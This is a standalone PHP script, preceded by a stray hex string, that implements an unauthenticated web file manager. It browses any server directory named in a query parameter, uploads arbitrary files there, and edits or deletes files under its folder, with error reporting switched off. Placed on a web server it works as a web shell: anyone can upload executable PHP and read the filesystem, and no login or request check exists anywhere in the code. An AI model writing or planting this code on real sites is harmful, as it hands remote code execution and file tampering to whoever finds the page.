8a199e27dcaec87b
<?php
error_reporting(0);
$path = isset($_GET['p']) ? $_GET['p'] : dirname(__FILE__);
$path = realpath($path);
if (!$path || !is_dir($path)) $path = dirname(__FILE__);
$self = basename(__FILE__);
$base = dirname(__FILE__);

if (isset($_POST['del'])) {
    $f = realpath($_POST['del']);
    if ($f && strpos($f, $base) === 0) {
        if (is_dir($f)) @rmdir($f); else @unlink($f);
    }
    header('Location: ?p=' . urlencode(dirname($f)));
    exit;
}

if (isset($_POST['save']) && isset($_POST['file'])) {
    $f = realpath($_POST['file']);
    if ($f && strpos($f, $base) === 0 && is_file($f)) {
        file_put_contents($f, $_POST['content']);
    }
    header('Location: ?p=' . urlencode(dirname($f)));
    exit;
}

if (isset($_FILES['up']) && $_FILES['up']['error'] == 0) {
    $dest = $path . '/' . basename($_FILES['up']['name']);
    move_uploaded_file($_FILES['up']['tmp_name'], $dest);
    header('Location: ?p=' . urlencode($path));
    exit;
}

if (isset($_GET['edit'])) {
    $f = realpath($_GET['edit']);
    if ($f && strpos($f, $base) === 0 && is_file($f)) {
        $c = htmlspecialchars(file_get_contents($f));
        echo '<form method="post"><input type="hidden" name="file" value="' . htmlspecialchars($f) . '">';
        echo '<textarea name="content" rows="30" cols="100">' . $c . '</textarea><br>';
        echo '<input type="submit" name="save" value="Save"> <a href="?p=' . urlencode(dirname($f)) . '">Back</a></form>';
        exit;
    }
}

echo '<b>' . htmlspecialchars($path) . '</b><br><br>';
echo '<a href="?p=' . urlencode(dirname($path)) . '">..</a><br><br>';

echo '<form method="post" enctype="multipart/form-data">';
echo '<input type="file" name="up"><input type="submit" value="Upload"></form><br>';

$dh = opendir($path);
$items = array();
while (($f = readdir($dh)) !== false) {
    if ($f == '.' || $f == '..') continue;
    $items[] = $f;
}
closedir($dh);
sort($items);

echo '<table border="1" cellpadding="3">';
echo '<tr><th>Name</th><th>Size</th><th>Perms</th><th>Owner</th><th>Actions</th></tr>';

foreach ($items as $f) {
    $full = $path . '/' . $f;
    $is_dir = is_dir($full);
    $perms = substr(sprintf('%o', fileperms($full)), -4);
    $owner = function_exists('posix_getpwuid') ? @posix_getpwuid(fileowner($full)) : array('name' => fileowner($full));
    $owner = isset($owner['name']) ? $owner['name'] : $owner;
    $size = $is_dir ? '[DIR]' : filesize($full);

    echo '<tr>';
    if ($is_dir) {
        echo '<td><a href="?p=' . urlencode($full) . '">' . htmlspecialchars($f) . '/</a></td>';
    } else {
        echo '<td>' . htmlspecialchars($f) . '</td>';
    }
    echo '<td>' . $size . '</td>';
    echo '<td>' . $perms . '</td>';
    echo '<td>' . htmlspecialchars($owner) . '</td>';
    echo '<td>';
    if (!$is_dir) {
        echo '<a href="?edit=' . urlencode($full) . '">Edit</a> ';
    }
    echo '<form method="post" style="display:inline" onsubmit="return confirm(\'Delete?\')">';
    echo '<input type="hidden" name="del" value="' . htmlspecialchars($full) . '">';
    echo '<input type="submit" value="Del"></form>';
    echo '</td></tr>';
}
echo '</table>';
?>